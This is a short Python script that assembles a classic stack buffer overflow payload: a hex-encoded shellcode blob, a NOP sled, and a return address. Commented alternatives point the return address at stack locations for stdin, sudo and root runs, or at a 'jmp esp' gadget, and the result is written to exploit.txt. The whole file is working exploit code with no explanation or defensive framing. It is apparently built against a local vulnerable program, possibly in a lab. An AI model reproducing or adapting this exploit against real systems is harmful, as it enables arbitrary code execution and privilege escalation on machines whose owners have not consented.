
totalexploitlength = int(102)

hexshellcode = 'bd8a07daa1daded97424f45a31c9b112316a1283c20403e0093854c5ce4b7476b2e0117abde6561c706805b93a56e7b972d00ed1448a86b22dc968b5164489050e071b367ca412594f2b76f13e030469d774c50b4e02fa99c39d1cadef505e'

hexshellcodelength = len(hexshellcode) / 2

returnaddresslength = 4

numhexnops = totalexploitlength - returnaddresslength - hexshellcodelength

hexnops = ''

hexnewline = '0a'

for i in range(0,int( (numhexnops ) )):
    hexnops += '90'

# for reading exploit file
# return address NOP sled in beginning of stack buffer at ffffcb0b
returnaddress = '0b' + 'cb' + 'ff' + 'ff'

# for reading stdin
# return address NOP sled in beginning of stack buffer at ffffcafd
returnaddress = 'fd' + 'ca' + 'ff' + 'ff'

# for reading stdin with sudo
# return address NOP sled in beginning of stack buffer at ffffcafd
returnaddress = 'ab' + 'd0' + 'ff' + 'ff'

# for reading stdin as root
# return address NOP sled in beginning of stack buffer at ffffceeb
returnaddress = 'eb' + 'ce' + 'ff' + 'ff'

# return address to jmp esp instruction at 5e9a515e
returnaddress = '5e' + '51' + '9a' + '5e'

# only write one byte of return address
#returnaddress = '5e'

rawdata = bytes.fromhex( hexnops + hexshellcode + returnaddress        + hexnops + hexnops + hexnops + hexnops + hexshellcode + hexnewline) # + '' + returnaddress)

with open("exploit.txt", "wb") as file:
    file.write(rawdata)
